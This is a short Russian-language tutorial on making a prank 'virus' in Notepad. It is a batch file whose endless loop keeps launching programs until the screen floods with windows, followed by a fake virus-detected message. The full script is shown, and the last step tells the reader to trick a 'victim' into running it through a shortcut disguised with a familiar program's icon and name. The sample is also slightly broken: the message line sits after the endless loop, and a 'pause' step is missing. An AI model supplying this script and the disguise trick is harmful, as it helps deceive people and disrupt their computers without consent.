Как сделать вирус в блокноте?

Всё просто!

1 Сначало надо открыть блокнот

2 Наберите «@echo off», а затем, с новой строки, «CLS»

3 Чтобы открыть определенное количество окон, с новой строки наберите в Блокноте следующую команду: start (название программы)

4 Чтобы открыть бесконечное количество окон, сначала с новой строки наберите :A

5 На следующей строке наберите start iexplore.exe (или другую программу)

6 И, наконец, строкой ниже наберите goto A

7 Чтобы отобразить сообщение, начните новую строку и наберите echo Ваше сообщение

8 Затем с новой строки наберите pause

9 У вас должно получится так:

@echo off

CLS

:A

start notepad.exe

goto A

echo Fatal.Error.Virus Detected.

10 Когда закончите, в меню Блокнота выберите Файл > Сохранить как..., а затем укажите расширение файла «.bat»

11 Заставьте пользователя открыть файл. Чтобы ваша шутка сработала, нужно сделать так, чтобы «жертва» запустила ее. Этого можно добиться разными способами. Один из самых работающих — создать ярлык для своего пакетного файла и изменить его иконку на что-то, чем пользователь действительно пользуется, а затем изменить название ярлыка, чтобы оно соответствовало иконке. Откиньтесь на спинку кресла и наблюдайте за результатами из удобного места
